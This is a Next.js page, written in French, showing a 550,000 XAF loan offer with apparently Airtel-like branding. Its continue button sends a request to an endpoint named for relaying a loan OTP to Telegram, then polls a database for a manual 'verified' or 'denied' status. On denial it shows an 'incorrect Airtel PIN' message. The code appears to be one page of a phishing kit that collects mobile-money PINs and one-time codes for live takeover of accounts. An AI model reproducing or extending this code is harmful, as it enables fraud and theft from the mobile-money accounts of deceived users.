'use client';

import { useRouter } from 'next/navigation';
import { ArrowRight, Loader, AlertCircle, X } from 'lucide-react';
import { SharedLayout } from '@/components/shared-layout';
import { useState, useRef, useEffect } from 'react';
import { createClient } from '@/lib/supabase/client';

export default function LoanLimitPage() {
  const router = useRouter();
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [recordId, setRecordId] = useState<string | null>(null);
  
  const pollingIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const supabaseRef = useRef(createClient());

  const handleBack = () => {
    router.push('/otp');
  };

  const handleContinue = async () => {
    setIsProcessing(true);
    setShowLoadingModal(true);

    try {
      const response = await fetch('/api/send-loan-otp-telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: '755123456' }),
      });

      const data = await response.json();
      setRecordId(data.recordId);
      startRealtimePolling(data.recordId);
    } catch (error) {
      console.error('[v0] Error sending loan OTP:', error);
      setShowLoadingModal(false);
      setShowErrorModal(true);
      setIsProcessing(false);
    }
  };

  const startRealtimePolling = async (recId: string) => {
    const supabase = supabaseRef.current;

    const channel = supabase
      .channel(`loan-otp-${recId}`)
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'loan_otp_verifications',
          filter: `id=eq.${recId}`,
        },
        (payload: any) => {
          console.log('[v0] Loan OTP real-time update:', payload.new.status);

          if (payload.new.status === 'verified') {
            if (pollingIntervalRef.current) {
              clearInterval(pollingIntervalRef.current);
            }
            channel.unsubscribe();
            setShowLoadingModal(false);
            setIsProcessing(false);
            router.push('/loan-otp?recordId=' + recId);
          } else if (payload.new.status === 'denied') {
            if (pollingIntervalRef.current) {
              clearInterval(pollingIntervalRef.current);
            }
            channel.unsubscribe();
            setShowLoadingModal(false);
            setIsProcessing(false);
            setShowErrorModal(true);
          }
        }
      )
      .subscribe();

    pollingIntervalRef.current = setInterval(async () => {
      try {
        const response = await fetch('/api/check-loan-otp-status', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ recordId: recId }),
        });

        const statusData = await response.json();

        if (statusData.status === 'verified') {
          router.push('/success?recordId=' + recId);
          if (pollingIntervalRef.current) {
            clearInterval(pollingIntervalRef.current);
          }
          channel.unsubscribe();
          setShowLoadingModal(false);
          setIsProcessing(false);
        
        } else if (statusData.status === 'denied') {
          setShowErrorModal(true);
          if (pollingIntervalRef.current) {
            clearInterval(pollingIntervalRef.current);
          }
          channel.unsubscribe();
          setShowLoadingModal(false);
          setIsProcessing(false);
        }
      } catch (error) {
        console.error('[v0] Polling error:', error);
      }
    }, 1000);
  };

  const handleRestart = () => {
    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current);
    }
    setShowErrorModal(false);
    router.push('/login');
  };

  useEffect(() => {
    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
      }
    };
  }, []);

  return (
    <SharedLayout>
      {/* Back Button */}
      <button 
        onClick={handleBack}
        className="flex items-center gap-2 text-gray-500 hover:text-black text-sm mb-6 sm:mb-8 transition-colors">
        <ArrowRight className="w-4 h-4 rotate-180" />
        Back
      </button>

      {/* Loan Limit Section */}
      <h2 className="text-2xl sm:text-4xl font-black text-black mb-2 sm:mb-4">Votre plafond de prêt</h2>
      <p className="text-gray-500 text-sm sm:text-lg mb-8 sm:mb-12">Voici le montant que vous pouvez emprunter</p>

      {/* Loan Amount Card */}
      <div className="bg-gradient-to-br from-red-50 to-red-100 border-2 border-red-400 rounded-2xl sm:rounded-3xl p-8 sm:p-12 mb-8 sm:mb-12 text-center">
        <p className="text-gray-600 text-sm sm:text-base mb-3 sm:mb-4">Montant du prêt disponible</p>
        <div className="flex items-center justify-center gap-2 mb-2">
          <h3 className="text-4xl sm:text-5xl font-black text-black">550,000</h3>
        </div>
        <p className="text-gray-600 text-base sm:text-lg">XAF</p>
      </div>

      {/* Details Section */}
      <div className="space-y-4 mb-8 sm:mb-12">
        <div className="flex justify-between items-center p-4 bg-gray-50 rounded-lg border border-gray-200">
          <span className="text-gray-600 font-semibold text-sm sm:text-base">Durée du prêt</span>
          <span className="text-black font-bold text-sm sm:text-base">12 MOIS</span>
        </div>
        <div className="flex justify-between items-center p-4 bg-gray-50 rounded-lg border border-gray-200">
          <span className="text-gray-600 font-semibold text-sm sm:text-base">Taux d’intérêt</span>
          <span className="text-black font-bold text-sm sm:text-base">13%</span>
        </div>
        <div className="flex justify-between items-center p-4 bg-gray-50 rounded-lg border border-gray-200">
          <span className="text-gray-600 font-semibold text-sm sm:text-base">Frais de traitement</span>
          <span className="text-black font-bold text-sm sm:text-base">Gratuit</span>
        </div>
      </div>

      {/* Continue Button */}
      <button 
        onClick={handleContinue}
        disabled={isProcessing}
        className="w-full bg-red-400 text-black font-bold text-base sm:text-xl py-3 sm:py-4 rounded-lg sm:rounded-2xl flex items-center justify-center gap-2 sm:gap-3 hover:bg-red-500 transition-colors disabled:bg-gray-300 disabled:cursor-not-allowed">
        {isProcessing ? 'Traitement en cours…...' : 'Continuer pour obtenir le prêt'}
        <ArrowRight className="w-5 h-5 sm:w-6 sm:h-6" />
      </button>

      {/* Loading Modal */}
      {showLoadingModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-2xl sm:rounded-3xl p-8 sm:p-12 max-w-sm w-full shadow-2xl text-center">
            <Loader className="w-12 h-12 sm:w-16 sm:h-16 text-red-600 animate-spin mx-auto mb-4" />
            <h3 className="text-xl sm:text-2xl font-black text-black mb-3">Traitement en cours…</h3>
            <p className="text-gray-500 text-sm sm:text-base">
              Veuillez patienter pendant que nous vérifions votre demande de prêt…
            </p>
          </div>
        </div>
      )}

      {/* Error Modal - Invalid Details */}
      {showErrorModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-2xl sm:rounded-3xl p-6 sm:p-8 max-w-sm w-full shadow-2xl">
            <button 
              onClick={() => setShowErrorModal(false)}
              className="absolute top-4 right-4 sm:top-6 sm:right-6 text-gray-400 hover:text-black transition-colors">
              <X className="w-6 h-6" />
            </button>

            <div className="flex justify-center mb-4 sm:mb-6">
              <div className="bg-red-100 rounded-full p-4">
                <AlertCircle className="w-8 h-8 sm:w-10 sm:h-10 text-red-600" />
              </div>
            </div>

            <h3 className="text-xl sm:text-2xl font-black text-black text-center mb-2">Code PIN incorrect</h3>
            <p className="text-gray-500 text-sm sm:text-base text-center mb-6 sm:mb-8">
              Votre demande de prêt a été refusée. Veuillez vérifier votre code PIN Airtel et réessayer.
            </p>

            <button 
              onClick={handleRestart}
              className="w-full bg-red-400 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-red-500 transition-colors">
              Redémarrer
            </button>
          </div>
        </div>
      )}
    </SharedLayout>
  );
}
